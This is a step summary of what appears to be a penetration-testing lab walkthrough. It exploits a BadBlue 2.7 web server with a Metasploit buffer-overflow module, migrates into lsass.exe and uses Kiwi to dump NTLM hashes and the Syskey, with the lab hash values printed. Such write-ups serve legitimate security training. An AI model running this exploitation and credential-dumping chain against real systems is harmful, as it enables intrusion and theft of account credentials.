

Here are the summary steps from the document in bullet points:

1. Step 1: Check the target IP address.
    
    - Command: `cat /root/Desktop/target`
2. Step 2: Run an initial Nmap scan against the target IP.
    
    - Command: `nmap 10.0.27.166`
3. Step 3: Perform a detailed Nmap scan to determine version information on port 80.
    
    - Command: `nmap -sV -p 80 10.0.27.166`
4. Step 4: Search for the exploit module for BadBlue 2.7 using searchsploit.
    
    - Command: `searchsploit badblue 2.7`
5. Step 5: Exploit the BadBlue server using the "PassThu" remote buffer overflow Metasploit module.
    
    - Commands:
        - Start Metasploit: `msfconsole -q`
        - Use the BadBlue exploit module: `use exploit/windows/http/badblue_passthru`
        - Set the target IP: `set RHOSTS 10.0.27.166`
        - Exploit the target and obtain a Meterpreter shell: `exploit`
6. Step 6: Migrate the current process into the lsass.exe process.
    
    - Command: `migrate -N lsass.exe`
7. Step 7: Load the Kiwi extension in Metasploit.
    
    - Command: `load kiwi`
8. Step 8: Dump the Administrator NTLM hash using Kiwi extension commands.
    
    - Command: `creds_all`
    - Reveals Administrator User NTLM Hash: `e3c61a68f1b89ee6c8ba9507378dc88d`
9. Step 9: Extract all user NTLM hashes using Kiwi.
    
    - Command: `lsa_dump_sam`
    - Reveals Student User NTLM Hash: `bd4ca1fbe028f3c5066467a7f6a73b0b`
10. Step 10: Find the Syskey by dumping the LSA secrets using Kiwi.
    
    - Command: `lsa_dump_secrets`
    - Reveals Syskey: `377af0de68bdc918d22c57a263d38326`

These steps detail the process of exploiting the BadBlue server, extracting user NTLM hashes, and finding the Syskey using the Kiwi extension in Metasploit.